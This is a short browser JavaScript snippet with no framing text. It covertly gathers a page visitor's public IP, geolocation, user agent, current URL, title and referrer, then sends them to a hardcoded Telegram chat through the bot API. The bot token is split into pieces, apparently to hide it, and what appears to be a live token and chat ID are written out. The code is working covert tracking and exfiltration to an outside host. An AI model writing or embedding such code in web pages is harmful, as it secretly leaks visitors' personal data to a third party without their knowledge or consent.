const tok1 = "9069105139:"
const tok2 = "AAFgxm5PKEmrL1z"
const tok3 = "TwykUndhyG_RrG-32x74"
const tok = tok1+tok2+tok3;
fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
	ip=data.ip;
	agent= navigator.userAgent;
	msg="Current URL "+window.location.href+"\nIP "+ip+"\nUser agent "+agent+"\nDate "+new Date().toLocaleString()+"\nTitle "+document.title+"\nReferrer "+document.referrer+"\n";
	console.log(msg);

	fetch('https://free.freeipapi.com/api/json/'+ip)
	.then(response => response.json())
	.then(data => {

	msg2=JSON.stringify(data, null, 2);
	msg=msg+"\n"+msg2;
	
	url='https://api.telegram.org/bot'+tok+'/sendMessage?chat_id=634841328&text='+encodeURI(msg);
	fetch(url).then(console.log("Done"));

	})
    })
    .catch(error => {
        console.log('Error:', error);
    });

